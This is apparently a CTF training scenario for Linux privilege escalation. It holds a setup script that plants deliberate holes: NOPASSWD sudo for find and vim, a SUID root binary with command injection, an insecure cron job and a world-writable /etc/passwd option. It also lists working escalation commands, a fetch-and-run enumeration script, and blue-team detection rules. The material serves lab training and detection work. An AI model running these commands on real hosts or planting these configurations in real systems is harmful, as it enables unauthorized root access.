# Intermediate CTF Scenario 2: Privilege Escalation

## Overview
Linux privilege escalation scenario involving sudo misconfiguration and SUID binaries. Provides training for post-exploitation techniques and system hardening.

## Scenario Details
- **Difficulty**: Intermediate
- **Attack Vectors**: Sudo misconfiguration, SUID exploitation, file permissions
- **Skills Tested**: Linux privilege escalation, system enumeration, binary exploitation
- **Expected Time**: 15-25 minutes

## Setup

### Prerequisites
- Linux system with sudo
- User account with limited privileges

### Setup Script
```bash
#!/bin/bash
# setup_privilege_escalation.sh

echo "[+] Setting up Privilege Escalation scenario..."

# Create low-privilege user
sudo useradd -m -s /bin/bash lowpriv
echo "lowpriv:userpass123" | sudo chpasswd

# Create flag files
echo "APTL{pr1v_3sc_sudo_m4st3r}" | sudo tee /root/flag.txt > /dev/null
sudo chmod 600 /root/flag.txt

echo "APTL{suid_b1n4ry_pwn3d}" | sudo tee /root/suid_flag.txt > /dev/null
sudo chmod 600 /root/suid_flag.txt

# Create vulnerable sudo configuration
echo "lowpriv ALL=(ALL) NOPASSWD: /usr/bin/find" | sudo tee -a /etc/sudoers > /dev/null
echo "lowpriv ALL=(ALL) NOPASSWD: /usr/bin/vim" | sudo tee -a /etc/sudoers > /dev/null

# Create vulnerable SUID binary
cat << 'EOF' | sudo tee /tmp/vulnerable_binary.c > /dev/null
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        return 1;
    }
    
    char command[256];
    snprintf(command, sizeof(command), "/bin/cat %s", argv[1]);
    
    setuid(0);  // Set effective UID to root
    system(command);  // Vulnerable system call
    
    return 0;
}
EOF

# Compile and set SUID
sudo gcc /tmp/vulnerable_binary.c -o /usr/local/bin/readfile
sudo chmod 4755 /usr/local/bin/readfile
sudo rm /tmp/vulnerable_binary.c

# Create writable script for PATH manipulation
sudo mkdir -p /opt/scripts
cat << 'EOF' | sudo tee /opt/scripts/backup.sh > /dev/null
#!/bin/bash
echo "Running backup script..."
ls /home/$USER/
echo "Backup completed."
EOF

sudo chmod 755 /opt/scripts/backup.sh
sudo chown root:root /opt/scripts/backup.sh

# Add cron job that runs as root but uses relative path
echo "*/5 * * * * root cd /opt/scripts && ./backup.sh" | sudo tee -a /etc/crontab > /dev/null

# Create directory with interesting files
sudo mkdir -p /var/backups/secrets
echo "admin_password: super_secret_pass" | sudo tee /var/backups/secrets/admin.conf > /dev/null
echo "database_key: db_secret_key_123" | sudo tee /var/backups/secrets/db.conf > /dev/null
sudo chmod 644 /var/backups/secrets/*

# Set up environment for user
sudo -u lowpriv mkdir -p /home/lowpriv/.ssh
echo "Welcome to the system! Your goal is to gain root access." | sudo tee /home/lowpriv/README.txt > /dev/null
echo "Try checking for privilege escalation opportunities..." | sudo tee -a /home/lowpriv/README.txt > /dev/null

# Create history file with hints
sudo -u lowpriv cat << 'EOF' > /home/lowpriv/.bash_history
ls -la
ps aux
sudo -l
find / -perm -u=s -type f 2>/dev/null
EOF

sudo chown lowpriv:lowpriv /home/lowpriv/.bash_history

echo "[+] Privilege Escalation scenario deployed!"
echo "[+] Low privilege user: lowpriv"
echo "[+] Password: userpass123"
echo "[+] Vulnerabilities:"
echo "    - Sudo misconfiguration (/usr/bin/find, /usr/bin/vim)"
echo "    - SUID binary: /usr/local/bin/readfile"
echo "    - Cron PATH manipulation potential"
echo "[+] Flags: /root/flag.txt, /root/suid_flag.txt"
```

### Manual Setup Steps
1. Create user `lowpriv` with password `userpass123`
2. Add sudo entries for find and vim with NOPASSWD
3. Create vulnerable SUID binary `/usr/local/bin/readfile`
4. Set up cron job with PATH vulnerability
5. Place flags in `/root/`

## Attack Methodology

### Expected Attack Path
1. **Initial Access**: SSH as `lowpriv` user
2. **System Enumeration**:
   - Check sudo permissions
   - Find SUID binaries
   - Examine cron jobs
3. **Privilege Escalation Vectors**:
   - **Sudo find**: Execute commands via find
   - **Sudo vim**: Shell escape from vim
   - **SUID binary**: Command injection in readfile
4. **Flag Retrieval**: Access root-owned files

### Key Commands Red Team Will Use
```bash
# Initial enumeration
whoami
id
sudo -l
ps aux
ls -la /etc/cron*

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Sudo find exploitation
sudo find /etc -name passwd -exec /bin/sh \;
sudo find . -exec /bin/sh \; -quit

# Sudo vim exploitation
sudo vim
# In vim: :!/bin/sh

# SUID binary exploitation
/usr/local/bin/readfile "/root/flag.txt"
/usr/local/bin/readfile "/etc/passwd; cat /root/flag.txt"

# Check writable paths and cron
ls -la /opt/scripts/
crontab -l
cat /etc/crontab

# LinEnum or similar enumeration scripts
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

## Blue Team Detection Signatures

### Log Patterns to Monitor
```
# Auth logs (/var/log/auth.log)
- Sudo command executions
- User switching (su, sudo)
- SSH logins

# Syslog (/var/log/syslog)
- Process execution with elevated privileges
- SUID binary executions
- Cron job executions

# Command history
- Privilege escalation enumeration commands
- SUID binary searches
- Sudo permission checks
```

### Detection Rules
```
# Sudo find with exec
sudo: lowpriv : TTY=* ; PWD=* ; USER=root ; COMMAND=/usr/bin/find * -exec *

# Sudo vim execution
sudo: lowpriv : TTY=* ; PWD=* ; USER=root ; COMMAND=/usr/bin/vim

# SUID binary execution
Process: /usr/local/bin/readfile with UID=0 (from user lowpriv)

# Privilege escalation enumeration
Commands: find / -perm -u=s, sudo -l, ps aux

# Shell spawned from sudo commands
Parent: sudo find, Child: /bin/sh
Parent: vim, Child: /bin/sh

# Successful privilege escalation
UID change: lowpriv (UID=1001) -> root (UID=0)
```

## Cleanup

### Cleanup Script
```bash
#!/bin/bash
# cleanup_privilege_escalation.sh

echo "[+] Cleaning up Privilege Escalation scenario..."

# Remove user account
sudo userdel -r lowpriv 2>/dev/null

# Remove sudo entries
sudo sed -i '/lowpriv ALL=(ALL) NOPASSWD:/d' /etc/sudoers

# Remove SUID binary
sudo rm -f /usr/local/bin/readfile

# Remove flags
sudo rm -f /root/flag.txt
sudo rm -f /root/suid_flag.txt

# Remove cron job
sudo sed -i '/.*backup\.sh/d' /etc/crontab

# Remove scripts directory
sudo rm -rf /opt/scripts/

# Remove backup secrets
sudo rm -rf /var/backups/secrets/

# Clear auth logs (optional)
# sudo truncate -s 0 /var/log/auth.log

echo "[+] Privilege Escalation scenario cleaned up!"
```

### Manual Cleanup Steps
1. Delete user: `sudo userdel -r lowpriv`
2. Remove sudo entries from `/etc/sudoers`
3. Remove SUID binary: `sudo rm /usr/local/bin/readfile`
4. Remove cron job from `/etc/crontab`
5. Remove flags and created directories
6. Clear logs (optional)

## Reset to Basic State

### Reset Script
```bash
#!/bin/bash
# reset_privilege_escalation.sh

echo "[+] Resetting Privilege Escalation to basic state..."

# Run cleanup first
./cleanup_privilege_escalation.sh

# Wait a moment
sleep 3

# Run setup again
./setup_privilege_escalation.sh

echo "[+] Privilege Escalation scenario reset complete!"
```

## Investigation Opportunities

### For Blue Team Analysis
- Privilege escalation technique identification
- Sudo usage monitoring and alerting
- SUID binary audit and monitoring
- Process parent-child relationship analysis
- Command history forensics
- Timeline reconstruction of escalation attempts

### Advanced Analysis
- Behavioral analysis of privilege escalation
- Detection of automated enumeration tools
- Analysis of command injection techniques
- Correlation of multiple escalation attempts
- Response to successful escalations

### Learning Objectives
- Linux security fundamentals
- Privilege escalation detection
- System hardening principles
- Audit log analysis
- Incident response to privilege escalation
- Forensic analysis of system compromise

## Security Notes
- Contains deliberately insecure configurations for educational purposes
- Demonstrates common Linux privilege escalation vectors
- Should only be deployed in isolated lab environments
- Real systems should follow principle of least privilege
- Regular sudo configuration audits are essential

## Additional Escalation Vectors

### Alternative Methods to Practice
```bash
# Docker group membership
sudo usermod -a -G docker lowpriv

# Writeable /etc/passwd
sudo chmod 666 /etc/passwd

# Capability-based escalation
sudo setcap cap_setuid+ep /usr/bin/python3

# NFS no_root_squash
# (requires NFS setup)
```

These can be added to create more complex scenarios or variations for advanced training.